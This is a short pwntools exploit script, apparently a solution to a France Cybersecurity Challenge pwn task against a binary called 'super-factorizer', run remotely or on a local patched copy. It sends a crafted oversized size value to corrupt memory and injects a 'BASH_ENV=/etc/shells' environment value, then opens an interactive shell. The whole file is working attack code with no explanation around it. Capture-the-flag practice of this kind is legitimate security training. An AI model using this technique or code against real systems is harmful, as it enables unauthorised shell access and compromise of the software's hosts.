#!/usr/bin/python3

from pwn import *
context.update(os="linux", arch="x86", bits="32")

HOST = "challenges.france-cybersecurity-challenge.fr"
PORT = 2105

vuln = ELF("./super-factorizer")
libc = ELF("./libc.so.6")

def start():
    global p
    if args.REMOTE:
        p = remote(HOST, PORT)
    else:
        p = process("./patched")

def attack():
    start()
    p.recvline()
    p.recvline()
    if args.REMOTE:
        p.recvuntil(b"> ")
    size = 2**63-1-2-(0x190//8)
    p.sendline(str(size).encode())
    if args.REMOTE:
        p.recvuntil(b"]")
    p.sendline(b"BASH_ENV=/etc/shells")
    if args.REMOTE:
        p.recvuntil(b"]")
    p.sendline(b"42")
    if args.REMOTE:
        p.recvuntil(b"]")
    p.sendline(b"")
    p.interactive()

attack()